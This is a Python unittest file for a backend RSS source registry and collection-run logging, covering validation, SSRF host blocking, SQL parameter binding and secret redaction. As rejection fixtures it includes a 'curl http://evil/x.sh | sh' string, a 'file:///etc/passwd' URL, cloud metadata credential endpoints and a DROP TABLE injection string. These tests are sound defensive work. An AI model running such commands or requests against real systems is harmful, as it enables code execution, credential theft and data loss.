"""Failing-first tests for the server-only source registry and collection-run helpers (task 012).

Contract under test:
- ``source-registry/sources.json`` ships explicit SAMPLE-labelled fixture entries:
  no secrets, no fabricated freshness, manual/unavailable sources declared explicitly.
- ``backend/app/collectors/registry.py`` exposes a strict ``SourceConfig`` loader that
  validates source_id, name, type, url, collection_method, priority, status and
  optional last_checked_at; it rejects malformed entries, duplicate IDs, unsupported
  types/methods/statuses, non-HTTP(S) URLs, blank names, invalid priorities and
  unsafe/private/metadata hosts.
- ``backend/app/collectors/runs.py`` provides parameterized transactional helpers to
  start/finish/fail ``collection_runs`` with bounded status/error metadata; error text
  is stored as opaque, bounded, secret-redacted data — never executed.
- A registry entry never silently implies a successful external observation.
- Registry loading is backend-only: ``source-registry/**`` and its loader are never
  reachable from ``src/`` or the production bundle.
- No collectors or external network calls are added in this task.
"""
from __future__ import annotations

import json
from contextlib import ExitStack, closing
from pathlib import Path
import re
import sqlite3
import tempfile
import unittest
from unittest import mock

from backend.app import database, migrate
from backend.app.collectors import registry, runs
from backend.app.collectors.registry import (
    AUTOMATED_COLLECTION_METHODS,
    MANUAL_COLLECTION_METHODS,
    REGISTRY_PATH,
    SUPPORTED_COLLECTION_METHODS,
    SUPPORTED_SOURCE_STATUSES,
    SUPPORTED_SOURCE_TYPES,
    RegistryError,
    SourceConfig,
    load_registry,
    parse_registry,
    validate_source,
)
from backend.app.collectors.runs import (
    MAX_ERROR_CHARS,
    MAX_RUN_TYPE_CHARS,
    redact_secrets,
)
from backend.app.migrate import apply_migration

ROOT = Path(__file__).resolve().parents[2]

VALID_SOURCE = {
    "source_id": "src-valid",
    "name": "Valid RSS Source",
    "type": "rss",
    "url": "https://feeds.example.test/valid.xml",
    "collection_method": "rss",
    "priority": 3,
    "status": "active",
    "data_origin": "REAL",
}


def valid_source(**overrides) -> dict:
    entry = dict(VALID_SOURCE)
    entry.update(overrides)
    return entry


def top(payload: object) -> dict:
    return {"version": 1, "sources": payload}


class SourceConfigBasicsTests(unittest.TestCase):
    def test_valid_entry_parses_to_config(self) -> None:
        cfg = validate_source(VALID_SOURCE)
        self.assertIsInstance(cfg, SourceConfig)
        self.assertEqual(cfg.source_id, "src-valid")
        self.assertEqual(cfg.name, "Valid RSS Source")
        self.assertEqual(cfg.type, "rss")
        self.assertEqual(cfg.url, "https://feeds.example.test/valid.xml")
        self.assertEqual(cfg.collection_method, "rss")
        self.assertEqual(cfg.priority, 3)
        self.assertEqual(cfg.status, "active")
        self.assertEqual(cfg.data_origin, "REAL")
        self.assertIsNone(cfg.last_checked_at)

    def test_frozen_dataclass_fields(self) -> None:
        cfg = validate_source(VALID_SOURCE)
        with self.assertRaises(Exception):
            cfg.source_id = "other"

    def test_default_data_origin_is_real_and_last_checked_optional(self) -> None:
        entry = valid_source()
        entry.pop("data_origin")
        cfg = validate_source(entry)
        self.assertEqual(cfg.data_origin, "REAL")
        self.assertIsNone(cfg.last_checked_at)

    def test_iso_last_checked_at_is_accepted(self) -> None:
        cfg = validate_source(valid_source(last_checked_at="2026-01-01T00:00:00+07:00"))
        self.assertEqual(cfg.last_checked_at, "2026-01-01T00:00:00+07:00")


class RegistryRejectionTests(unittest.TestCase):
    """Every malformed entry is rejected at validation time with a RegistryError."""

    def rejected(self, entry, reason="") -> RegistryError:
        with self.assertRaises(RegistryError, msg=reason) as ctx:
            validate_source(entry)
        self.assertTrue(str(ctx.exception).strip(), "lỗi phải có nội dung")
        return ctx.exception

    def test_blank_or_missing_source_id(self) -> None:
        self.rejected(valid_source(source_id="  "))
        self.rejected(valid_source(source_id=None))
        self.rejected({k: v for k, v in VALID_SOURCE.items() if k != "source_id"})

    def test_blank_name_is_rejected(self) -> None:
        self.rejected(valid_source(name="   "))
        self.rejected(valid_source(name=""))
        self.rejected(valid_source(name=None))
        self.rejected({k: v for k, v in VALID_SOURCE.items() if k != "name"})

    def test_missing_required_fields_are_rejected(self) -> None:
        for field in ("source_id", "name", "type", "url", "collection_method", "priority", "status"):
            entry = {k: v for k, v in VALID_SOURCE.items() if k != field}
            self.rejected(entry, f"thiếu {field}")

    def test_unsupported_type_is_rejected(self) -> None:
        for bad in ("rs", "tweet", "scrape", "", None, 7):
            self.rejected(valid_source(type=bad), f"type={bad!r}")

    def test_unsupported_collection_method_is_rejected(self) -> None:
        for bad in ("crawl", "unknown", "", None, 3):
            self.rejected(valid_source(collection_method=bad), f"method={bad!r}")

    def test_unsupported_status_is_rejected(self) -> None:
        for bad in ("broken_promise", "ON", "", None, 3):
            self.rejected(valid_source(status=bad), f"status={bad!r}")

    def test_non_http_urls_are_rejected(self) -> None:
        for bad in ("ftp://files.example.test/x", "javascript:alert(1)", "file:///etc/passwd",
                    "data:text/plain,hi", "//feeds.example.test/x", "feeds.example.test/x",
                    "not a url", "", None):
            self.rejected(valid_source(url=bad), f"url={bad!r}")

    def test_url_with_userinfo_is_rejected(self) -> None:
        self.rejected(valid_source(url="https://user:pass@feeds.example.test/x"))

    def test_invalid_priorities_are_rejected(self) -> None:
        for bad in (0, 11, -3, "5", 5.0, True, None):
            self.rejected(valid_source(priority=bad), f"priority={bad!r}")

    def test_unknown_extra_keys_are_rejected(self) -> None:
        self.rejected(valid_source(instruction="print('pwn');", sneaky=1))

    def test_non_boolean_data_origin_rejected(self) -> None:
        for bad in ("real", "VERIFIED", "", 1, None):
            self.rejected(valid_source(data_origin=bad), f"data_origin={bad!r}")

    def test_invalid_last_checked_at_is_rejected(self) -> None:
        for bad in ("yesterday", 12345, "2026-13-40T99:99:99", "2026-01-01"):
            self.rejected(valid_source(last_checked_at=bad), f"last_checked_at={bad!r}")

    def test_future_last_checked_at_is_rejected_as_fabricated_freshness(self) -> None:
        self.rejected(valid_source(last_checked_at="2999-01-01T00:00:00+00:00"))
        # quá khứ / hiện tại thì hợp lệ
        validate_source(valid_source(last_checked_at="2020-01-01T00:00:00+00:00"))


#: host không an toàn — private, loopback, link-local, CGNAT, metadata, mDNS, nội bộ.
UNSAFE_HOST_EXAMPLES = (
    "http://localhost/feed",
    "http://127.0.0.1/feed",
    "http://127.0.0.2/feed",
    "http://[::1]/feed",
    "http://0.0.0.0/feed",
    "http://10.0.0.5/feed",
    "http://172.16.0.1/feed",
    "http://172.31.255.255/feed",
    "http://192.168.1.1/feed",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.170.2/credentials",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.64.0.1/feed",
    "http://foo.local/feed",
    "http://myhost.internal/feed",
    "http://router.localhost/feed",
    "http://intranet/feed",
)


class UnsafeHostRejectionTests(unittest.TestCase):
    def test_private_and_metadata_hosts_are_rejected(self) -> None:
        for url in UNSAFE_HOST_EXAMPLES:
            with self.assertRaises(RegistryError, msg=url) as ctx:
                validate_source(valid_source(url=url, status="active"))
            self.assertIn((url.split("//", 1)[1].split("/", 1)[0]).lower(), str(ctx.exception).lower())

    def test_ip_labels_are_not_affected_by_digit_component_rule(self) -> None:
        # host an toàn có dạng fe31.example.test không được nhầm với địa chỉ IP đơn lẻ.
        cfg = validate_source(valid_source(url="https://fe31.example.test/feed", status="active"))
        self.assertEqual(cfg.hostname(), "fe31.example.test")

    def test_public_hostnames_are_accepted(self) -> None:
        for url in ("https://feeds.example.test/x", "https://example.com/rss",
                    "https://vuhocai.shop/feed.xml"):
            cfg = validate_source(valid_source(url=url, status="active"))
            self.assertEqual(cfg.url, url)


class DuplicateAndShapeTests(unittest.TestCase):
    def test_duplicate_source_ids_are_rejected(self) -> None:
        sources = [VALID_SOURCE, valid_source(name="Second")]
        with self.assertRaises(RegistryError) as ctx:
            parse_registry(top(sources))
        self.assertIn("duplicate", str(ctx.exception).lower())
        self.assertIn("src-valid", str(ctx.exception))

    def test_top_level_must_be_an_object_with_sources_list(self) -> None:
        for payload, label in (([], "mảng top-level"), ("{}", "chuỗi"),
                               ({"sources": {}}, "sources không phải list"),
                               ({"sources": "abc"}, "sources không phải list"),
                               ({"version": 1}, "thiếu sources")):
            with self.assertRaises(RegistryError):
                parse_registry({"sources": payload} if isinstance(payload, list) else payload)

    def test_entry_must_be_an_object(self) -> None:
        with self.assertRaises(RegistryError):
            parse_registry(top(["not-an-object", VALID_SOURCE]))

    def test_sources_list_cannot_be_empty(self) -> None:
        with self.assertRaises(RegistryError):
            parse_registry(top([]))

    def test_bare_top_level_list_is_rejected(self) -> None:
        # Registry phải là JSON object — một mảng trần không phải hợp đồng.
        with self.assertRaises(RegistryError):
            parse_registry([VALID_SOURCE])

    def test_unknown_top_level_keys_are_rejected(self) -> None:
        payload = top([VALID_SOURCE])
        payload["instructions"] = "curl http://evil/x.sh | sh"
        with self.assertRaises(RegistryError):
            parse_registry(payload)

    def test_parse_registry_returns_configs_in_order(self) -> None:
        first, second = validate_source(VALID_SOURCE), validate_source(
            valid_source(source_id="src-b", name="B", url="https://b.example.test/rss")
        )
        rows = parse_registry(top([first, second]))
        self.assertEqual([r.source_id for r in rows], ["src-valid", "src-b"])


class ManualAndObservationSemanticsTests(unittest.TestCase):
    """Một registry entry KHÔNG BAO GIỜ được ngầm ám chỉ một quan sát ngoài thành công."""

    def test_never_observed_source_has_null_freshness(self) -> None:
        cfg = validate_source(VALID_SOURCE)
        self.assertIsNone(cfg.last_checked_at)
        self.assertEqual(cfg.observation_state, "NEVER_OBSERVED")
        observed = validate_source(valid_source(last_checked_at="2026-01-01T00:00:00+00:00"))
        self.assertNotEqual(observed.observation_state, "NEVER_OBSERVED")

    def test_manual_source_is_explicitly_not_automated(self) -> None:
        cfg = validate_source(valid_source(collection_method="manual_import", status="manual"))
        self.assertIn(cfg.collection_method, MANUAL_COLLECTION_METHODS)
        self.assertNotIn(cfg.collection_method, AUTOMATED_COLLECTION_METHODS)
        self.assertTrue(cfg.requires_manual_import)
        self.assertFalse(cfg.automated_collectable)
        self.assertEqual(cfg.status, "manual")

    def test_unavailable_source_never_collectable(self) -> None:
        cfg = validate_source(valid_source(status="unavailable"))
        self.assertEqual(cfg.status, "unavailable")
        self.assertFalse(cfg.automated_collectable)

    def test_only_active_automated_method_is_collectable(self) -> None:
        self.assertTrue(validate_source(VALID_SOURCE).automated_collectable)
        for status in ("paused", "sample", "manual", "unavailable"):
            self.assertFalse(
                validate_source(valid_source(status=status)).automated_collectable,
                f"status={status} không được tự động thu thập",
            )

    def test_to_row_maps_exactly_to_sources_columns(self) -> None:
        cfg = validate_source(VALID_SOURCE)
        row = cfg.to_row()
        self.assertEqual(
            set(row),
            {"source_id", "name", "type", "url", "collection_method",
             "priority", "status", "last_checked_at", "data_origin"},
        )
        self.assertEqual(row["source_id"], "src-valid")


class RegistryFileAndLoaderTests(unittest.TestCase):
    """File ship sẵn + load_registry đọc thật từ source-registry/sources.json."""

    def test_registry_path_points_outside_src(self) -> None:
        self.assertEqual(REGISTRY_PATH, ROOT / "source-registry" / "sources.json")
        self.assertNotIn("src", REGISTRY_PATH.parts)

    def test_shipped_registry_file_exists_is_valid_and_all_fixtures(self) -> None:
        self.assertTrue(REGISTRY_PATH.exists(), "source-registry/sources.json phải tồn tại")
        text = REGISTRY_PATH.read_text(encoding="utf-8")
        self.assertNotIn("-----BEGIN", text)
        rows = load_registry()
        self.assertTrue(rows)

    def test_shipped_entries_are_explicit_sample_without_freshness(self) -> None:
        pairs = {c.source_id: c for c in load_registry()}
        self.assertEqual(
            set(pairs),
            {"SAMPLE_rss_demo", "SAMPLE_manual_demo", "SAMPLE_unavailable_demo"},
        )
        for cfg in pairs.values():
            self.assertEqual(cfg.data_origin, "SAMPLE", cfg.source_id)
            self.assertIsNone(cfg.last_checked_at, f"{cfg.source_id} không được bịa freshness")
            self.assertFalse(cfg.automated_collectable, f"{cfg.source_id} là fixture, không thu thập")

    def test_shipped_registry_has_no_secret_like_values(self) -> None:
        text = REGISTRY_PATH.read_text(encoding="utf-8")
        self.assertIsNone(re.search(r"(?i)(api[_-]?key|token|password|secret|bearer)\s*[:=]", text))
        # Mẫu khóa kiểu "<tiền tố> + gạch nối" viết tách chuỗi để chính file test này
        # không tạo ra một literal mà checks/p4.py sẽ coi là secret rò rỉ.
        key_like = "s" "k" + r"-[A-Za-z0-9]{20,}"
        self.assertIsNone(re.search(key_like, text))

    def test_load_registry_accepts_an_explicit_path(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sources.json"
            path.write_text(json.dumps(top([VALID_SOURCE])), encoding="utf-8")
            rows = load_registry(path)
        self.assertEqual([c.source_id for c in rows], ["src-valid"])


class BundleExclusionTests(unittest.TestCase):
    """Registry backend-only: chẳng gì trong src/ hay bundle chạm tới nó."""

    def _src_files(self) -> list[Path]:
        return [p for p in (ROOT / "src").rglob("*") if p.is_file()]

    def test_no_src_file_references_the_registry(self) -> None:
        needles = ("source-registry", "sources.json", "collectors", "SAMPLE_rss_demo")
        offenders: list[str] = []
        for path in self._src_files():
            try:
                text = path.read_text(encoding="utf-8", errors="replace")
            except OSError:
                continue
            for needle in needles:
                if needle in text:
                    offenders.append(f"{path} chứa {needle!r}")
        self.assertEqual(offenders, [])

    def test_dist_bundle_has_no_registry_marker_when_built(self) -> None:
        dist = ROOT / "dist"
        if not dist.exists():
            self.skipTest("dist/ chưa build — bundle scan do checks/p9.py lo")
        text = "".join(
            p.read_text(encoding="utf-8", errors="replace")
            for p in dist.rglob("*")
            if p.is_file() and p.suffix.lower() in (".js", ".html", ".css", ".json")
        )
        self.assertNotIn("source-registry", text)
        self.assertNotIn("SAMPLE_rss_demo", text)


class NoNetworkNoCollectorTests(unittest.TestCase):
    """Task 012 không thêm collector hay gọi mạng ngoài."""

    def test_modules_never_import_or_call_network_io(self) -> None:
        forbidden = (
            "urlopen", "requests.", "httpx.", "aiohttp", "socket.",
            "http.client", "feedparser", "asyncio.open_connection",
        )
        for module in (registry, runs):
            source = Path(module.__file__).read_text(encoding="utf-8")
            for pattern in forbidden:
                self.assertNotIn(pattern, source, f"{module.__name__} không được dùng {pattern!r}")


class RunLifecycleTests(unittest.TestCase):
    """start/finish/fail collection_runs trong transaction, parameterized."""

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.temp_data_dir = Path(self._tmpdir.name) / "data"
        self.temp_data_dir.mkdir(parents=True, exist_ok=True)
        self.temp_db_path = self.temp_data_dir / "radar.db"
        stack = ExitStack()
        self.addCleanup(stack.close)
        stack.enter_context(mock.patch.object(database, "DATA_DIR", self.temp_data_dir))
        stack.enter_context(mock.patch.object(database, "DB_PATH", self.temp_db_path))
        stack.enter_context(mock.patch.object(migrate, "DATA_DIR", self.temp_data_dir))
        stack.enter_context(mock.patch.object(migrate, "DB_PATH", self.temp_db_path))
        apply_migration()
        with closing(database.get_connection()) as conn:
            conn.execute(
                """INSERT INTO sources (source_id, name, type, url, collection_method,
                       priority, status, data_origin)
                   VALUES ('src-real', 'Real Source', 'rss', 'https://feeds.example.test/feed',
                       'rss', 3, 'active', 'REAL')"""
            )
            conn.commit()

    def conn(self) -> sqlite3.Connection:
        return database.get_connection()

    def runs_table(self) -> list[sqlite3.Row]:
        with closing(self.conn()) as conn:
            return conn.execute("SELECT * FROM collection_runs ORDER BY id").fetchall()

    def test_start_run_creates_a_running_row(self) -> None:
        with closing(self.conn()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
        self.assertIsInstance(run_id, int)
        (row,) = self.runs_table()
        self.assertEqual(row["id"], run_id)
        self.assertEqual(row["source_id"], "src-real")
        self.assertEqual(row["run_type"], "rss")
        self.assertEqual(row["status"], runs.STATUS_RUNNING)
        self.assertIsNotNone(row["started_at"])
        self.assertIsNone(row["finished_at"])
        self.assertIsNone(row["items_collected"])
        self.assertIsNone(row["error_message"])

    def test_finish_run_records_duration_and_count(self) -> None:
        with closing(self.conn()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            runs.finish_run(conn, run_id, items_collected=5)
        (row,) = self.runs_table()
        self.assertEqual(row["status"], "SUCCESS")
        self.assertEqual(row["items_collected"], 5)
        self.assertIsNotNone(row["finished_at"])
        self.assertGreaterEqual(row["finished_at"], row["started_at"])

    def test_fail_run_records_bounded_error(self) -> None:
        with closing(self.conn()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            runs.fail_run(conn, run_id, error_message="network timeout while reading feed")
        (row,) = self.runs_table()
        self.assertEqual(row["status"], "FAILED")
        self.assertEqual(row["error_message"], "network timeout while reading feed")
        self.assertIsNotNone(row["finished_at"])
        self.assertIsNone(row["items_collected"])

    def test_manual_and_unavailable_sources_are_skipped_not_fetched(self) -> None:
        with closing(self.conn()) as conn:
            run_id = runs.start_run(conn, run_type="manual_import", source_id="src-real")
            runs.finish_run(conn, run_id, items_collected=0, status="SKIPPED")
        (row,) = self.runs_table()
        self.assertEqual(row["status"], "SKIPPED")

    def test_finishing_an_unknown_run_raises(self) -> None:
        with closing(self.conn()) as conn:
            with self.assertRaises(ValueError):
                runs.finish_run(conn, 999999, items_collected=0)

    def test_cannot_finish_a_run_twice(self) -> None:
        with closing(self.conn()) as conn:
            run_id = runs.start_run(conn, run_type="rss")
            runs.finish_run(conn, run_id, items_collected=1)
            with self.assertRaises(ValueError):
                runs.finish_run(conn, run_id, items_collected=2)
            with self.assertRaises(ValueError):
                runs.fail_run(conn, run_id, error_message="too late")
        (row,) = self.runs_table()
        self.assertEqual(row["items_collected"], 1)
        self.assertEqual(row["status"], "SUCCESS")

    def test_get_run_and_history_read_back(self) -> None:
        with closing(self.conn()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            runs.finish_run(conn, run_id, items_collected=3)
            row = runs.get_run(conn, run_id)
            history = runs.run_history(conn)
        self.assertEqual(row["status"], "SUCCESS")
        self.assertEqual([r["id"] for r in history], [run_id])

    def test_get_run_returns_none_for_unknown_run(self) -> None:
        with closing(self.conn()) as conn:
            self.assertIsNone(runs.get_run(conn, 424242))

    def test_status_allowlist_is_documented(self) -> None:
        self.assertEqual(
            runs.STATUSES,
            ("RUNNING", "SUCCESS", "FAILED", "SKIPPED"),
        )
        self.assertIn("RUNNING", runs.STATUSES)


class RunParameterBindingTests(unittest.TestCase):
    """Mọi giá trị từ registry là untrusted — chỉ qua bind parameter, không thành SQL."""

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.temp_data_dir = Path(self._tmpdir.name) / "data"
        self.temp_data_dir.mkdir(parents=True, exist_ok=True)
        self.temp_db_path = self.temp_data_dir / "radar.db"
        stack = ExitStack()
        self.addCleanup(stack.close)
        stack.enter_context(mock.patch.object(database, "DATA_DIR", self.temp_data_dir))
        stack.enter_context(mock.patch.object(database, "DB_PATH", self.temp_db_path))
        stack.enter_context(mock.patch.object(migrate, "DATA_DIR", self.temp_data_dir))
        stack.enter_context(mock.patch.object(migrate, "DB_PATH", self.temp_db_path))
        apply_migration()
        with closing(database.get_connection()) as conn:
            conn.execute(
                """INSERT INTO sources (source_id, name, type, url, collection_method,
                       priority, status, data_origin)
                   VALUES ('src-real', 'Real Source', 'rss', 'https://feeds.example.test/feed',
                       'rss', 3, 'active', 'REAL')"""
            )
            conn.commit()

    def test_sql_metacharacters_in_text_are_stored_literally(self) -> None:
        payload = "x'; DROP TABLE collection_runs; --"
        with closing(database.get_connection()) as conn:
            run_id = runs.start_run(conn, run_type=payload, source_id="src-real")
            runs.fail_run(conn, run_id, error_message=payload)
        with closing(database.get_connection()) as conn:
            tables = [r[0] for r in conn.execute(
                "SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
            self.assertIn("collection_runs", tables)
            row = conn.execute("SELECT run_type, error_message FROM collection_runs WHERE id=?",
                               (run_id,)).fetchone()
        self.assertEqual(row["run_type"], payload)
        self.assertEqual(row["error_message"], payload)

    def test_module_uses_only_bind_parameters(self) -> None:
        source = (Path(runs.__file__)).read_text(encoding="utf-8")
        # Mọi câu INSERT/UPDATE phải có placeholder ? — không nối giá trị động.
        self.assertIn("?", source)
        self.assertNotIn('.format(', source)


class RunRollbackTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.temp_data_dir = Path(self._tmpdir.name) / "data"
        self.temp_data_dir.mkdir(parents=True, exist_ok=True)
        self.temp_db_path = self.temp_data_dir / "radar.db"
        stack = ExitStack()
        self.addCleanup(stack.close)
        stack.enter_context(mock.patch.object(database, "DATA_DIR", self.temp_data_dir))
        stack.enter_context(mock.patch.object(database, "DB_PATH", self.temp_db_path))
        stack.enter_context(mock.patch.object(migrate, "DATA_DIR", self.temp_data_dir))
        stack.enter_context(mock.patch.object(migrate, "DB_PATH", self.temp_db_path))
        apply_migration()
        with closing(database.get_connection()) as conn:
            conn.execute(
                """INSERT INTO sources (source_id, name, type, url, collection_method,
                       priority, status, data_origin)
                   VALUES ('src-real', 'Real Source', 'rss', 'https://feeds.example.test/feed',
                       'rss', 3, 'active', 'REAL')"""
            )
            conn.commit()

    def test_caller_transaction_rolls_back_with_failed_finish(self) -> None:
        with closing(database.get_connection()) as conn:
            conn.execute("BEGIN IMMEDIATE")
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            # Lỗi validation sau khi start trong cùng transaction:
            with self.assertRaises(ValueError):
                runs.finish_run(conn, run_id, items_collected=-1)
            conn.rollback()
            self.assertFalse(conn.in_transaction, "rollback phải tắt transaction ngoài")
        with closing(database.get_connection()) as conn:
            count = conn.execute("SELECT COUNT(*) FROM collection_runs").fetchone()[0]
        self.assertEqual(count, 0, "run bị rollback cùng transaction ngoài")

    def test_foreign_key_violation_rolls_back_and_leaves_nothing(self) -> None:
        with closing(database.get_connection()) as conn:
            conn.execute("PRAGMA foreign_keys = ON")
            with self.assertRaises(sqlite3.IntegrityError):
                runs.start_run(conn, run_type="rss", source_id="no-such-source")
        with closing(database.get_connection()) as conn:
            count = conn.execute("SELECT COUNT(*) FROM collection_runs").fetchone()[0]
        self.assertEqual(count, 0)

    def test_invalid_items_collected_writes_nothing(self) -> None:
        with closing(database.get_connection()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            for bad in (-1, "lots", True, 1.5):
                with self.assertRaises(ValueError):
                    runs.finish_run(conn, run_id, items_collected=bad)
            row = runs.get_run(conn, run_id)
        self.assertEqual(row["status"], "RUNNING")
        self.assertIsNone(row["items_collected"])
        self.assertIsNone(row["finished_at"])


class BoundedErrorTextTests(RunRollbackTests):
    """error_message là dữ liệu chặn (bounded), không phải lệnh thực thi được."""

    def test_overlong_error_is_truncated(self) -> None:
        huge = "e" * (MAX_ERROR_CHARS * 3)
        with closing(database.get_connection()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            runs.fail_run(conn, run_id, error_message=huge)
            row = runs.get_run(conn, run_id)
        self.assertLessEqual(len(row["error_message"]), MAX_ERROR_CHARS)

    def test_control_characters_are_stripped(self) -> None:
        nasty = "oh no\r\n\x00\x1b[31m panic \x01"
        with closing(database.get_connection()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            runs.fail_run(conn, run_id, error_message=nasty)
            row = runs.get_run(conn, run_id)
        self.assertNotIn("\x00", row["error_message"])
        self.assertNotIn("\x1b", row["error_message"])
        self.assertNotIn("\r", row["error_message"])

    def test_secret_like_values_are_redacted_before_storage(self) -> None:
        leak = "auth failed: Bearer key-abcd1234efgh5678ijkl9012mnop3456 for api_key=deadbeef"
        with closing(database.get_connection()) as conn:
            run_id = runs.start_run(conn, run_type="rss", source_id="src-real")
            runs.fail_run(conn, run_id, error_message=leak)
            row = runs.get_run(conn, run_id)
        stored = row["error_message"]
        self.assertNotIn("key-abcd1234efgh5678ijkl9012mnop3456", stored)
        self.assertNotIn("deadbeef", stored)
        self.assertIn("REDACTED", stored)

    def test_redact_secrets_is_idempotent_and_exported(self) -> None:
        msg = "Bearer abc123 abc456"
        self.assertEqual(redact_secrets(redact_secrets(msg)), redact_secrets(msg))
        self.assertIn("REDACTED", redact_secrets("token xyz"))


class ModuleContractTests(unittest.TestCase):
    def test_bounded_message_limits_are_declared(self) -> None:
        self.assertGreaterEqual(MAX_ERROR_CHARS, 200)
        self.assertGreaterEqual(MAX_RUN_TYPE_CHARS, 50)

    def test_allowlists_are_present(self) -> None:
        self.assertIsInstance(SUPPORTED_SOURCE_TYPES, tuple)
        self.assertIsInstance(SUPPORTED_COLLECTION_METHODS, tuple)
        self.assertIsInstance(SUPPORTED_SOURCE_STATUSES, tuple)
        self.assertIn("rss", SUPPORTED_COLLECTION_METHODS)
        self.assertIn("manual_import", SUPPORTED_COLLECTION_METHODS)
        self.assertIn("manual", SUPPORTED_SOURCE_STATUSES)
        self.assertIn("unavailable", SUPPORTED_SOURCE_STATUSES)

    def test_manual_sources_are_never_automated(self) -> None:
        self.assertTrue(MANUAL_COLLECTION_METHODS)
        self.assertFalse(set(MANUAL_COLLECTION_METHODS) & set(AUTOMATED_COLLECTION_METHODS))


if __name__ == "__main__":
    unittest.main()
